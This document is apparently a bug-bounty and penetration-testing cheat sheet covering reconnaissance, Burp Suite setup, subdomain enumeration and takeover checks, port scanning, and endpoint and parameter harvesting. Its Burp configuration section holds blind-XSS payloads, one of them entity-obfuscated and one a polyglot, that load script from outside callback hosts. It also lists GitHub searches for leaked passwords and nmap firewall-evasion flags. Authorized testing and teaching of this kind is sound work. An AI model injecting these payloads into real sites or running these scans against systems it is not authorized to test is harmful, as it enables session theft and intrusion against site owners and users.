Recon:-
-------
- crunchbase.com
- amass intel -org "Tesla"
- amass intel -active -asn 39416
- amass intel -active -cidr 159.69.129.82/32		#from ping or dig
- whois slack.com       >> to get the registrant email address who registered the domain.
- arin.net/reference/research/whowas/   if whois isn't giving results.
- whoxy.com:email addr:registrant email addr >> to find all the domains registered with it.
- employees linkedin accounts >> but time consuming.
- hunter.io to find emails: admin@target.com
- https://aleph.occrp.org/
- https://grep.app/

## hurricane electric
https://bgp.he.net/		>	open ASNs		> 	look fore prefix v4 to gather ip ranges

## github search:
gitdorks domain.com

## webanalyze -host https://www.google.com -crawl 2

## get emails
https://anymailfinder.com/
......@dropbox.com

https://github.com/search?q=%22nasa.gov%22+password&type=code
https://github.com/search?q=%22%22+password&type=code

---------------------------------------------------------------------------------------------------------------------------------------------------

burpsuite_plugins:-
-------------------
- HTTP Request Smuggler
Detects HTTP desync / request smuggling vulnerabilities by probing how front-end and back-end servers parse requests differently.
- Param Miner
Discovers hidden parameters in headers, cookies, and request bodies using wordlists and smart guessing techniques.
- Autorize
Automatically tests authorization by replaying requests with a low-privileged (or no-auth) session to detect access control issues.
- AutoRepeater
Resends requests automatically with custom rules and highlights response differences for easier vuln detection.
- Active Scan++
Extends Burp’s active scanner with additional checks like host header injection, cache poisoning, and other advanced attack vectors.
- Auth Analyzer
Performs advanced authorization testing with dynamic token extraction/replacement (e.g., CSRF/session tokens) and response analysis.
- Logger++
Advanced logging tool for HTTP traffic with filtering, searching, tagging, and persistence beyond Burp’s default proxy history.
- J2EEScan
Scanner focused on Java/J2EE misconfigurations and common enterprise Java vulnerabilities.
- inQL (GraphQL Scanner)
Helps test GraphQL endpoints by mapping schemas, generating queries, and identifying common GraphQL vulnerabilities.
- Turbo Intruder
High-performance HTTP fuzzer designed for large-scale attacks like race conditions, brute force, and desync testing.
- Agartha
Provides payload generation, fuzzing utilities, and encoding/decoding helpers for manual web testing.
Additional Scanner Checks
Adds extra passive and active scanning rules to identify more edge-case vulnerabilities.
- JWT Editor
Tool for decoding, modifying, signing, and attacking JSON Web Tokens (JWT), including weak key and alg attacks.
- JS Link Finder
Extracts endpoints and hidden links from JavaScript files to improve recon and attack surface discovery.


configure burpsuite:-
---------------------
proxy > response modification rules
network > match and replace (xss in user agent) report.xss
request and response rules (in scope only)
http history > insope only
live scan configuration
if there is file upload page use extension: upload scanner
	after uploading a file, send the uploads url request to this extension
if NGINX is running use extension: nginx alias traversal
if a page with php and parameters use: param miner
if there is 403 page: 403 bypasser
XSS
Referer: '"><script src=https://xss.report/c/YOUR-USERNAME></script>
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:135.0) Gecko/20100101 Firefox/135.0 '"><script src=https://xss.report/c/YOUR-USERNAME></script>
request body:
xss1		'"><script src=https://xss.report/c/YOUR-USERNAME></script>
match=xss2
replace='%22%3E%3Cscript%20src=https://xss.report/c/YOUR-USERNAME%3E%3C/script%3E
match=xss3
replace=JavaScript://%250A/*?'/*\'/*"/*\"/*`/*\`/*%26apos;)/*<! →</Title/</Style/</Script/</textArea/</iFrame/</noScript>\74k<K/contentEditable/autoFocus/OnFocus=/*${/*/;{/**/(import(/https:\\X55.is?1=14564/.source))}//\76 →
match=xss2
replace=javascript:eval('var a=document.createElement(\'script\');a.src=\'https://xss.report/c/YOUR-USERNAME\';document.body.appendChild(a)')
match=xss3
replace=var a=document.createElement("script");a.src="https://xss.report/c/YOUR-USERNAME";document.body.appendChild(a);
match=xss4
replace=&quot;&gt;&lt;&#105;&#102;&#114;&#97;&#109;&#101;&#32;&#115;&#114;&#99;&#100;&#111;&#99;&equals;&quot;&lt;&#115;&#99;&#114;&#105;&#112;&#116;&gt;&#118;&#97;&#114;&#32;&#97;&equals;&#112;&#97;&#114;&#101;&#110;&#116;&period;&#100;&#111;&#99;&#117;&#109;&#101;&#110;&#116;&period;&#99;&#114;&#101;&#97;&#116;&#101;&#69;&#108;&#101;&#109;&#101;&#110;&#116;&lpar;&quot;&#115;&#99;&#114;&#105;&#112;&#116;&quot;&rpar;&semi;&#97;&period;&#115;&#114;&#99;&equals;&quot;&#104;&#116;&#116;&#112;&#115;&colon;&sol;&sol;&#120;&#115;&#115;&period;&#114;&#101;&#112;&#111;&#114;&#116;&sol;&#99;&sol;&#89;&#79;&#85;&#82;&#45;&#85;&#83;&#69;&#82;&#78;&#65;&#77;&#69;&quot;&semi;&#112;&#97;&#114;&#101;&#110;&#116;&period;&#100;&#111;&#99;&#117;&#109;&#101;&#110;&#116;&period;&#98;&#111;&#100;&#121;&period;&#97;&#112;&#112;&#101;&#110;&#100;&#67;&#104;&#105;&#108;&#100;&lpar;&#97;&rpar;&semi;&lt;&sol;&#115;&#99;&#114;&#105;&#112;&#116;&gt;&quot;&gt;


you go and browse the app normally , make sure to click every button you find ( while burp proxy is on ) , then you go to burp history section and do scope only select only request with parameter and go to the request one by one and inject your payload on these urls , there a high chance you will find a reflected XSS :

---------------------------------------------------------------------------------------------------------------------------------------------------

Subdomain enumeration:-
-----------------------
export PDCP_API_KEY=YOUR-CHAOS-API-KEY && chaos -dL wildcards | tee -a subs-chaos
otherSUBS -l wildcards -o subs-others
cat wildcards | xargs -I{} -P 10 sh -c 'shuffledns -d {} -w ~/wordlists/dns.txt -r ~/wordlists/resolvers.txt -mode bruteforce' | tee -a subs-shuffledns
subfinder -dL wildcards -o subs-subfinder -all -recursive
shrewdeye wildcards -o subs-shrewdeye
cat wildcards | assetfinder --subs-only | tee -a subs-assetfinder
findomain -f wildcards | tee -a subs-findomain
sublist3r_domains wildcards -o subs-sublist3r
cat wildcards | xargs -P 5 -I{} sh -c 'gobuster dns --domain "{}" -w ~/wordlists/seclists/Discovery/DNS/subdomains-top1million-110000.txt --wildcard -o temp_{}.txt && awk "{print \$2}" temp_{}.txt | grep -v "^$" >> subs-gobuster && rm temp_{}.txt'
cat wildcards | xargs -P 5 -I{} sh -c 'ffuf -u "FUZZ.{}" -w ~/wordlists/seclists/Discovery/DNS/subdomains-top1million-110000.txt -mc 200,201,301,302,403,404,500,502 | tee -a subs-ffuf'
mkdir done && cat subs-* >> subs && cat subs | anew >> subdomains && mv subs subs-* done
awk 'NR==FNR{domains[$1]; next} {matched=0; for(d in domains) if($0==d || $0 ~ ("\\."d"$")) {matched=1; break} if(matched) print > "subs_allowed.txt"; else print > "subs_rejected.txt"}' wildcards subdomains && mv subdomains subs_rejected.txt done && mv subs_allowed.txt subdomains && rm temp_*


Subdomain takeover:-
--------------------
cat subs.txt | xargs -P 50 -I % bash -c "dig % | grep CNAME" | awk '{print $1}' | sed 's/\.$//g' | httpx -silent -status-code -cdn -csp-probe -tls-probe
subzy run --targets subdomains --vuln --hide_fails --concurrency 100 --verify_ssl --output subzy | grep -Ev "Cargo Collective|DISCUSSION|DOCUMENTATION"
cat subzy | grep -oP '"subdomain":\s*"([^"]+)"|"engine":\s*"([^"]+)"' | awk 'NR%2{printf "%s ", $0; next} {print $0}' | tee subzy-check && sed -i '/Unbounce\|Cargo Collective\|Uptimerobot\|Akamai/d' subzy-check
subjack -w subdomains -t 100 -v -ssl -c /root/go/pkg/mod/github.com/haccer/subjack@v0.0.0-20201112041112-49c51e57deab/fingerprints.json -o subjack
SubOver -l subdomains.txt -t 100 -a -v -https -o subover			#copy the providers.json file in current location
aquatone is good to verify qith visual sight of pages
# verify: dig example.example.com CNAME >> take the CNAME and see if you can register it.

---------------------------------------------------------------------------------------------------------------------------------------------------

Alive subdomains:-
------------------
sed -i '/^-/d' subdomains
cat subdomains | httpx | tee -a httpx
awk '{gsub(/https?:\/\//, ""); print}' httpx >> httpx-noproto
cat subdomains | httpx -sc -cl -td -fr -title -vhost -ip -web-server -o httpx-info
cat subdomains | httpx -mc 200,201 -o httpx2xx
cat subdomains | httpx -mc 401,403,404 -o httpx4xx
cat subdomains | httpx -mc 301,302 -o httpx3xx
cat subdomains | httpx -mc 502,503,500 -o httpx5xx
cat domains | httprobe -c 50 -t 20000 | tee -a domains-proto

---------------------------------------------------------------------------------------------------------------------------------------------------

Collecting: #endpoints.txt parameters.txt jsfiles.txt from live hosts:-
node ~/dom.js httpx2xx

---------------------------------------------------------------------------------------------------------------------------------------------------

Hosts:-
-------
#for domains
for i in $(cat domains); do dig +noall +answer "$i" | awk '{print $1}' | sed 's/\.$//'; done | anew | tee -a hosts2 && cat hosts2 | grep -Fxv -f domains | tee -a hosts-domains
cat hosts-domains | httpx | tee -a hosts-domains-alive
cat hosts-domains | httpx -sc -cl -title -ip -vhost -td | tee -a hosts-domains-alive-info
cat hosts-domains | httpx -mc 200 | tee -a hosts-domains-alive200

#for wildcards
for i in $(cat httpx-noproto); do dig +noall +answer "$i" | awk '{print $1}' | sed 's/\.$//'; done | anew | tee -a hosts1 && awk -F. '{n=NF; if(n>1) print $(n-1)"."$n}' wildcards | sort -u > wildcards-clean && cat hosts1 | grep -Fxv -f httpx-noproto | awk 'NR==FNR{w[$0]=1; next} {for(x in w) if($0==x || $0 ~ ("\\."x"$")) next}1' wildcards-clean - | tee -a hosts-httpx && mv wildcards-clean done
cat hosts-httpx | httpx | tee -a hosts-alive
cat hosts-httpx | httpx -sc -cl -title -ip -vhost -td | tee -a hosts-alive-info
cat hosts-httpx | httpx -mc 200 | tee -a hosts-alive200

nuclei -l hosts-alive -tags swagger -rl 50 | tee -a nuclei-hosts-swagger
nuclei -l hosts-alive -o nuclei-hosts-httpx -s low,medium,high,critical -rl 50

cat hosts-alive | while read -r url; do echo "Results for $url" | tee -a ffuf-hosts0; ffuf -u "https://$url/FUZZ" -w ~/wordlists/mywordlist.txt -fs 0 -mc 200 -timeout 5 -ac -recursion | uniffuf | tee -a ffuf-hosts0; echo "--------------------------------------" | tee -a ffuf-hosts0; done
awk '/^Results for / {url=$3; out=""; next} /^[[:space:]]*[-]+$/ {if(out!=""){sub(/\n$/,"",out); print url "\n" out} url=""; out=""; next} NF && url {ep=$1; gsub(/\x1B\[[0-9;]*[a-zA-Z]/,"",ep); gsub(/\r/,"",ep); if(ep ~ /^\//) out=out ep "\n"; else out=out "/" ep "\n"} END {if(out!=""){sub(/\n$/,"",out); print url "\n" out}}' ffuf-hosts0 | awk '{gsub(/^[ \t]+|[ \t]+$/,""); if($0 ~ /^https?:\/\//){url_num=NR; last_url_num=url_num; url_map[url_num]=$0} else if(length($0)>0){print url_map[last_url_num] "/" $0}}' | sed 's#\([^:]\)/\+#\1/#g' > ffuf-hosts

---------------------------------------------------------------------------------------------------------------------------------------------------

Port scanning:-
---------------
cat httpx-noproto | naabu -p 21,22,23,25,53,67,68,69,80,110,123,135,137,139,143,161,162,179,389,443,445,465,500,587,873,993,995,1194,1433,1812,1813,2049,3000,3128,3306,3389,4500,5000,5060,5061,5432,5672,5900,5985,5986,6379,8000,8008,8080,8081,8443,8888,9000,9080,9200,9300,10000,11211,27017 -o naabu
 cat naabu | httpx -sc -td -title -cl -fr -vhost -ip -web-server | tee -a naabu-httpx


awk '{gsub(/https?:\/\//, ""); print}' httpx >> httpx-noproto
naabu -l httpx-noproto -p 1-65535 -o naabu
nmap -iL httpx-noproto -p- -oN nmap.txt			Do dnsx IPs
nmap target -Pn -sV -sC
nmap -p <openport> -sV url/ip
nmap example.com -p21 --script=ftp*
-pn bypass firewall 	-f fragment to bypass firewall -sS 2 handshakes only -D 10.10.10.10 decoy
--script=<scriptname> or --script=ssh* or --script=vuln or dos or exploit or brute

---------------------------------------------------------------------------------------------------------------------------------------------------

DNS enumeration:-
-----------------
cat httpx | dnsx -recon | tee -a dnsx && sed -r 's/\x1B\[[0-9;]*m//g' dnsx > cleaned_dnsx && grep -oE '\b([0-9]{1,3}\.){3}[0-9]{1,3}\b' cleaned_dnsx | tee -a dnsx-ips
grep -v '^[[:space:]]*-' httpx-noproto | sed '/^[[:space:]]*$/d' | while read -r domain || [ -n "$domain" ]; do dig +short A "$domain" | grep -Eo '([0-9]{1,3}\.){3}[0-9]{1,3}'; done > ips.txt
cat dnsx-ips >> ips.txt && cat ips.txt | anew >> ips && rm ips.txt dnsx-ips && mv ips ips.txt && cat ips.txt | cdnstrip -c 50 | tee -a ips && rm ips.txt

# take the A record IPs and filter out WAF ones then do portscan

cat ips | naabu -p 21,22,23,25,53,67,68,69,80,110,123,135,137,139,143,161,162,179,389,443,445,465,500,587,873,993,995,1194,1433,1812,1813,2049,3000,3128,3306,3389,4500,5000,5060,5061,5432,5672,5900,5985,5986,6379,8000,8008,8080,8081,8443,8888,9000,9080,9200,9300,10000,11211,27017 -o naabu-ips
cat naabu-ips | httpx -sc -td -title -cl -fr -vhost -ip -web-server | tee -a naabu-ips-httpx

cat ips | httpx | tee -a httpx-ips 
awk '{gsub(/https?:\/\//, ""); print}' httpx >> httpx-noproto-ips 
cat ips | httpx -sc -cl -td -fr -title -vhost -web-server -o httpx-info-ips 
cat ips | httpx -mc 200,201 -o httpx2xx-ips 
cat ips | httpx -mc 401,403,404 -o httpx4xx-ips 
cat ips | httpx -mc 301,302 -o httpx3xx-ips 
cat ips | httpx -mc 502,503,500 -o httpx5xx-ips 

cat httpx-ips | while read -r url; do echo "Results for $url" | tee -a ffuf0ips; ffuf -u "$url/FUZZ" -w ~/wordlists/mywordlist.txt -fs 0 -mc 200 -timeout 5 -ac -recursion | uniffuf | tee -a ffuf0ips; echo "--------------------------------------" | tee -a ffuf0ips; done
awk '/^Results for / {url=$3; out=""; next} /^[[:space:]]*[-]+$/ {if(out!=""){sub(/\n$/,"",out); print url "\n" out} url=""; out=""; next} NF && url {ep=$1; gsub(/\x1B\[[0-9;]*[a-zA-Z]/,"",ep); gsub(/\r/,"",ep); if(ep ~ /^\//) out=out ep "\n"; else out=out "/" ep "\n"} END {if(out!=""){sub(/\n$/,"",out); print url "\n" out}}' ffuf0ips | awk '{gsub(/^[ \t]+|[ \t]+$/,""); if($0 ~ /^https?:\/\//){url_num=NR; last_url_num=url_num; url_map[url_num]=$0} else if(length($0)>0){print url_map[last_url_num] "/" $0}}' | sed 's#\([^:]\)/\+#\1/#g' > ffufips

Collecting: #endpoints.txt parameters.txt jsfiles.txt from live hosts:-
-----------------------------------------------------------------------
node ~/dom.js httpx2xx-ips #wait to finish

while IFS= read -r domain; do curl -sG "https://web.archive.org/cdx/search/cdx" --data-urlencode "url=${domain}/*" --data-urlencode "collapse=urlkey" --data-urlencode "output=text" --data-urlencode "fl=original" | uro | anew | tee -a urls-wayback-ips; done < httpx-noproto-ips
katana -list httpx-ips -o urls-katana-ips -jc -dr -em 7z,7zip,accdb,backup,bak,cache,class,cfg,conf,config,css,crt,csv,csr,db,db3,dbf,doc,docx,ear,js,env,gitignore,dmg,gz,ini,jar,java,json,key,log,md,md5,mdb,pdf,pem,pl,plist,pptx,p12,rpm,py,properties,rar,exe,secret,dll,sh,sql,sqlcipher,sqlitedb,sqlite3,action,adr,ascx,asmx,axd,bkf,iso,bkp,asc,pub,msi,bok,achee,cfm,cnf,lst,mai,mbox,mbx,nsf,ora,pac,passwd,pcf,pgp,rdp,reg,rtf,skr,tpl,url,deb,wml,bat,xsd,tar,bin,tar.gz,tgz,txt,war,xls,xlsx,xml,xz,yaml,yml,swp,tmp,htm,img,zip,lock,aspx,asp,html,inc,php,old,jsp,cgi,jku,jwk,jks,jwt
cat httpx-ips | hakrawler | tee -a urls-hakrawler-ips
cat httpx-ips | gau --blacklist ico,svg,woff,ttf,html,list,css,png,jpg,gif --mc 200 >> urls-gau-ips
waymore -n -i httpx-noproto-ips -oU urls-waymore-dnsx -mode U
cat urls-*-ips >> allurls-ips && cat allurls-ips | anew | uro -o urls-ips && rm allurls-ips urls-*-ips

cat httpx-info-ips | grep IIS | tee -a IIS-dnsx && sed -i 's/ .*//' IIS-ips && for url in $(cat IIS-ips); do shortscan -F $url | tee -a IIS-scanned-ips; done

#clean for alien subs urls
awk -F/ 'NR==FNR{domains[$1]; next} {host=$3; sub(/:.*/,"",host); matched=0; for(d in domains) if(host==d || host ~ ("\\."d"$")) {matched=1; break} if(matched) print > "urls_allowed-ips.txt"; else print > "urls_rejected-ips.txt"}' ips urls-ips && mv urls-ips done && mv urls_allowed-ips.txt urls-ips
cat urls-ips | grep "=eyJ" | sort -u >> eyJ-ips
cat urls-ips | grep -iE 'admin|internal|dashboard' > admin-ips
cat urls-ips | grep -E -o '[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Za-z]{2,}' urls | sort -u > emails-ips
# wait for to finish: node ~/dom.js httpx2xx-ips       #endpoints-ips.txt parameters-ips.txt jsfiles-ips.txt
mkdir extensions-ips && cd extensions-ips && cat ../urls-ips | grep -Eo 'https?://[^ ]+\.(7z|7zip|accdb|backup|bak|cache|class|cfg|conf|config|css|crt|csv|csr|db|db3|dbf|doc|docx|ear|js|env|gitignore|dmg|gz|ini|jar|shtm|shtml|java|json|key|log|md|md5|mdb|pdf|pem|pl|plist|pptx|p12|rpm|py|properties|rar|exe|secret|dll|sh|sql|sqlcipher|sqlitedb|sqlite3|action|adr|map|ashx|ascx|asmx|axd|bkf|iso|bkp|asc|pub|msi|bok|achee|cfm|cnf|lst|mai|mbox|mbx|nsf|ora|pac|passwd|pcf|pgp|rdp|reg|rtf|skr|tpl|url|deb|wml|bat|xsd|tar|bin|tar\.gz|tgz|txt|war|xls|xlsx|xml|xz|yaml|yml|swp|tmp|htm|img|zip|lock|aspx|asp|html|inc|php|old|jsp|cgi|jku|jwk|jks|jwt|js\.map)(\?|$)' | while read -r url; do ext="${url##*.}"; ext="${ext%%\?*}"; echo "$url" >> "$ext"; done && cat ../jsfiles.txt >> js && cat js | anew >> jss && rm js && mv jss js && cd .. && mv jsfiles.txt done
cd extensions-ips && for f in *; do [ -f "$f" ] && httpx -l "$f" -o "${f}-alive"; done && cd ..
#extract endpoints and params from js files
total=$(wc -l < extensions-ips/js-alive); i=0; while read -r url; do i=$((i+1)); content=$(curl -s "$url"); echo "$content" | grep -oE '/[a-zA-Z0-9_/\.-]+(\?[a-zA-Z0-9_=&%-]*)?' | sed 's/\?.*$//' | sed -E 's/\.[a-zA-Z0-9]+$//' | anew endpoints.txt >/dev/null; echo "$content" | grep -oE '/[a-zA-Z0-9_/\.-]+\?[a-zA-Z0-9_=&%-]+' | sed 's/.*?//' | tr '&' '\n' | cut -d= -f1 | anew parameters.txt >/dev/null; printf "\r[%d/%d] %d%%" "$i" "$total" "$((i*100/total))"; done < extensions-ips/js-alive; echo
#extract endpoints from urls file (from extensions and endpoints)
awk -F/ '{p=""; for(i=4;i<NF;i++){p=p "/" $i} if(length(p)==0 && NF>3) p="/"; else if(length(p)>0 && substr(p,1,1)!="/") p="/" p; if(length(p)>0){gsub(/[:;%$&*()[\]{}]/,"",p); print p}}' urls | sed '/^$/d' | anew >> endpoints.txt
#params from urls
cat urls-ips | grep '?' | sed 's/.*?//' | tr '&' '\n' | cut -d'=' -f1 | anew | tee -a params-ips
#takes too long and gives too many >> may avoid
#cat extensions/js | while read url; do vars=$(curl -s "$url" | grep -Eo "var [a-zA-Z0-9_]+" | sed 's/^var //' | grep -v '.js' | grep -Ev '^[a-zA-Z]$'); [ -n "$vars" ] && echo "$vars" | tee -a params; done
cat ~/parameters.txt >> params && cat parameters.txt >> params 
cat params | anew >> parameters && mv params done && mv parameters.txt done
#strip urls off of params
sed 's/[?].*//' urls-ips | tee -a deparameterized-ips
#cleaning endpoints from dom.js
sed -E 's/\/[^\/]+\.[a-zA-Z0-9]+$//' endpoints.txt | sed -E 's/([^\?&#]+)(\?.*|#.*)?/\1/' | sed 's:/$::' | grep -v '^$' | anew >> endpoints && mv endpoints.txt done
#merging alive subs with found enpoints.txt
cat httpx-ips | while read -r url; do echo "Results for $url" | tee -a finalendpoints0-ips; ffuf -u "$url/FUZZ" -w endpoints -fs 0 -mc 200 -timeout 5 -ac | uniffuf | tee -a finalendpoints0-ips; echo "--------------------------------------" | tee -a finalendpoints0-ips; done && awk '/^Results for / {url=$3; out=""; next} /^[[:space:]]*[-]+$/ {if(out!=""){sub(/\n$/,"",out); print url "\n" out} url=""; out=""; next} NF && url {ep=$1; gsub(/\x1B\[[0-9;]*[a-zA-Z]/,"",ep); gsub(/\r/,"",ep); if(ep ~ /^\//) out=out ep "\n"; else out=out "/" ep "\n"} END {if(out!=""){sub(/\n$/,"",out); print url "\n" out}}' finalendpoints0-ips | awk '{gsub(/^[ \t]+|[ \t]+$/,""); if($0 ~ /^https?:\/\//){url_num=NR; last_url_num=url_num; url_map[url_num]=$0} else if(length($0)>0){print url_map[last_url_num] "/" $0}}' | sed 's#\([^:]\)/\+#\1/#g' > finalendpoints-ips
#parameters
grep -E '\.(php|asp|aspx|jsp|py|rb|pl|cgi|do|action|ashx)(\?|#|$)' urls-ips | sed -E 's/([^\?&#]+)(\?.*|#.*)?/\1/' | httpx -silent | tee -a extendedUrls-ips
cat extendedUrls-ips httpx-ips finalendpoints-ips >> phase1-ips
#ffufing for params
while read url; do echo "=== Testing $url ==="; baseline=$(curl -s -o /dev/null -w "%{size_download}" "${url}?dummyparam=123"); echo "Results for $url" | tee -a phase2-ips; ffuf -u "${url}?FUZZ=1" -w parameters -fs "$baseline" -timeout 5 -ac | uniffuf | tee -a phase2-ips; echo "--------------------------------------" | tee -a phase2-ips; done < phase1-ips
#cleaning ffuf output
awk '/^Results for / {url=$3; out=""; next} /^[[:space:]]*[-]+$/ {if(out!=""){sub(/\n$/,"",out); print url "\n" out} url=""; out=""; next} NF && url {ep=$1; gsub(/\x1B\[[0-9;]*[a-zA-Z]/,"",ep); gsub(/\r/,"",ep); if(length(ep)>0) out=out ep "\n"} END {if(out!=""){sub(/\n$/,"",out); print url "\n" out}}' phase2-ips | awk '{gsub(/^[ \t]+|[ \t]+$/,""); if($0 ~ /^https?:\/\//){url_num=NR; last_url_num=url_num; url_map[url_num]=$0} else if(length($0)>0){print url_map[last_url_num] "?" $0 "=1"}}' | anew >> parameterizedUrls-ips
#.js.map
mkdir jsmap-ips && cd jsmap-ips && while read -r url; do name=$(basename "$url" .js.map); sourcemapper -output "$name" -url "$url"; done < ../extensions-ips/js.map-alive
while read -r url; do name=$(basename "$url" .js); sourcemapper -output "$name" -jsurl "$url"; done < ../extensions-ips/js-alive; cd ..

nuclei -l httpx-ips -tags swagger -rl 50 | tee -a nuclei-swagger-ips
nuclei -l parameterizedUrls-ips -dast -o nuclei-dast-ips -s low,medium,high,critical -rl 50
nuclei -l httpx-ips -o nuclei-httpx-ips -s low,medium,high,critical -rl 50

---------------------------------------------------------------------------------------------------------------------------------------------------

Files and directories:-
-----------------------
cat httpx | while read -r url; do echo "Results for $url" | tee -a ffuf0; ffuf -u "$url/FUZZ" -w ~/wordlists/mywordlist.txt -fs 0 -mc 200 -timeout 5 -ac -recursion | uniffuf | tee -a ffuf0; echo "--------------------------------------" | tee -a ffuf0; done
awk '/^Results for / {url=$3; out=""; next} /^[[:space:]]*[-]+$/ {if(out!=""){sub(/\n$/,"",out); print url "\n" out} url=""; out=""; next} NF && url {ep=$1; gsub(/\x1B\[[0-9;]*[a-zA-Z]/,"",ep); gsub(/\r/,"",ep); if(ep ~ /^\//) out=out ep "\n"; else out=out "/" ep "\n"} END {if(out!=""){sub(/\n$/,"",out); print url "\n" out}}' ffuf0 | awk '{gsub(/^[ \t]+|[ \t]+$/,""); if($0 ~ /^https?:\/\//){url_num=NR; last_url_num=url_num; url_map[url_num]=$0} else if(length($0)>0){print url_map[last_url_num] "/" $0}}' | sed 's#\([^:]\)/\+#\1/#g' > ffuf
cat httpx2xx | while read -r url; do echo "Results for $url" | tee -a ffuf2xx0; ffuf -u "$url/FUZZ" -w ~/wordlists/mywordlist.txt -fs 0 -mc 200 -ac -recursion | uniffuf | tee -a ffuf2xx0; echo "--------------------------------------" | tee -a ffuf2xx0; done
awk '/^Results for / {url=$3; out=""; next} /^[[:space:]]*[-]+$/ {if(out!=""){sub(/\n$/,"",out); print url "\n" out} url=""; out=""; next} NF && url {ep=$1; gsub(/\x1B\[[0-9;]*[a-zA-Z]/,"",ep); gsub(/\r/,"",ep); if(ep ~ /^\//) out=out ep "\n"; else out=out "/" ep "\n"} END {if(out!=""){sub(/\n$/,"",out); print url "\n" out}}' ffuf2xx0 | awk '{gsub(/^[ \t]+|[ \t]+$/,""); if($0 ~ /^https?:\/\//){url_num=NR; last_url_num=url_num; url_map[url_num]=$0} else if(length($0)>0){print url_map[last_url_num] "/" $0}}' | sed 's#\([^:]\)/\+#\1/#g' > ffuf2xx
cat httpx4xx | while read -r url; do echo "Results for $url" | tee -a ffuf4xx0; ffuf -u "$url/FUZZ" -w ~/wordlists/mywordlist.txt -fs 0 -mc 200 -ac -recursion | uniffuf | tee -a ffuf4xx0; echo "--------------------------------------" | tee -a ffuf4xx0; done
awk '/^Results for / {url=$3; out=""; next} /^[[:space:]]*[-]+$/ {if(out!=""){sub(/\n$/,"",out); print url "\n" out} url=""; out=""; next} NF && url {ep=$1; gsub(/\x1B\[[0-9;]*[a-zA-Z]/,"",ep); gsub(/\r/,"",ep); if(ep ~ /^\//) out=out ep "\n"; else out=out "/" ep "\n"} END {if(out!=""){sub(/\n$/,"",out); print url "\n" out}}' ffuf4xx0 | awk '{gsub(/^[ \t]+|[ \t]+$/,""); if($0 ~ /^https?:\/\//){url_num=NR; last_url_num=url_num; url_map[url_num]=$0} else if(length($0)>0){print url_map[last_url_num] "/" $0}}' | sed 's#\([^:]\)/\+#\1/#g' > ffuf4xx
cat httpx5xx | while read -r url; do echo "Results for $url" | tee -a ffuf5xx0; ffuf -u "$url/FUZZ" -w ~/wordlists/mywordlist.txt -fs 0 -mc 200 -ac -recursion | uniffuf | tee -a ffuf5xx0; echo "--------------------------------------" | tee -a ffuf5xx0; done
awk '/^Results for / {url=$3; out=""; next} /^[[:space:]]*[-]+$/ {if(out!=""){sub(/\n$/,"",out); print url "\n" out} url=""; out=""; next} NF && url {ep=$1; gsub(/\x1B\[[0-9;]*[a-zA-Z]/,"",ep); gsub(/\r/,"",ep); if(ep ~ /^\//) out=out ep "\n"; else out=out "/" ep "\n"} END {if(out!=""){sub(/\n$/,"",out); print url "\n" out}}' ffuf5xx0 | awk '{gsub(/^[ \t]+|[ \t]+$/,""); if($0 ~ /^https?:\/\//){url_num=NR; last_url_num=url_num; url_map[url_num]=$0} else if(length($0)>0){print url_map[last_url_num] "/" $0}}' | sed 's#\([^:]\)/\+#\1/#g' > ffuf5xx
cat httpx3xx | while read -r url; do echo "Results for $url" | tee -a ffuf3xx0; ffuf -u "$url/FUZZ" -w ~/wordlists/mywordlist.txt -fs 0 -mc 200 -ac -recursion | uniffuf | tee -a ffuf3xx0; echo "--------------------------------------" | tee -a ffuf3xx0; done
awk '/^Results for / {url=$3; out=""; next} /^[[:space:]]*[-]+$/ {if(out!=""){sub(/\n$/,"",out); print url "\n" out} url=""; out=""; next} NF && url {ep=$1; gsub(/\x1B\[[0-9;]*[a-zA-Z]/,"",ep); gsub(/\r/,"",ep); if(ep ~ /^\//) out=out ep "\n"; else out=out "/" ep "\n"} END {if(out!=""){sub(/\n$/,"",out); print url "\n" out}}' ffuf3xx0 | awk '{gsub(/^[ \t]+|[ \t]+$/,""); if($0 ~ /^https?:\/\//){url_num=NR; last_url_num=url_num; url_map[url_num]=$0} else if(length($0)>0){print url_map[last_url_num] "/" $0}}' | sed 's#\([^:]\)/\+#\1/#g' > ffuf3xx

#ffufing new endpoints:-
while read -r domain; do while read -r ep; do url="https://$domain$ep"; echo "$url" | tee -a ffufEndpoints; ffuf -u "$url/FUZZ" -w ~/wordlists/mywordlist.txt -fs 0 -mc 200 -timeout 5 -ac | uniffuf | tee -a ffufEndpoints; echo "--------------------------------------" | tee -a ffufEndpoints; done < endpoints.txt; done < httpx-noproto

#for ffuf and dirsearch:-
-e .7z,.7zip,.accdb,.backup,.bak,.cache,.class,.cfg,.conf,.config,.css,.crt,.csv,.csr,.db,.db3,.dbf,.doc,.docx,.ear,.js,.env,.gitignore,.dmg,.gz,.ini,.jar,.java,.json,.key,.log,.md,.md5,.mdb,.pdf,.pem,.pl,.plist,.pptx,.p12,.rpm,.py,.properties,.rar,.exe,.secret,.dll,.sh,.sql,.sqlcipher,.sqlitedb,.sqlite3,.action,.adr,.ascx,.asmx,.axd,.bkf,.iso,.bkp,.asc,.pub,.msi,.bok,.achee,.cfm,.cnf,.lst,.mai,.mbox,.mbx,.nsf,.ora,.pac,.passwd,.pcf,.pgp,.rdp,.reg,.rtf,.skr,.tpl,.url,.deb,.wml,.bat,.xsd,.tar,.bin,.tar.gz,.tgz,.txt,.war,.xls,.xlsx,.xml,.xz,.yaml,.yml,.swp,.tmp,.htm,.img,.lock,.aspx,.asp,.html,.inc,.php,.old,.jsp,.cgi,.jku,.jwk,.jks,.jwt

---------------------------------------------------------------------------------------------------------------------------------------------------

Url gathering:-
---------------
otherURLS -i wildcards -o urls-others
cat httpx | gau --blacklist ico,svg,woff,ttf,list,png,jpg,gif >> urls-gau
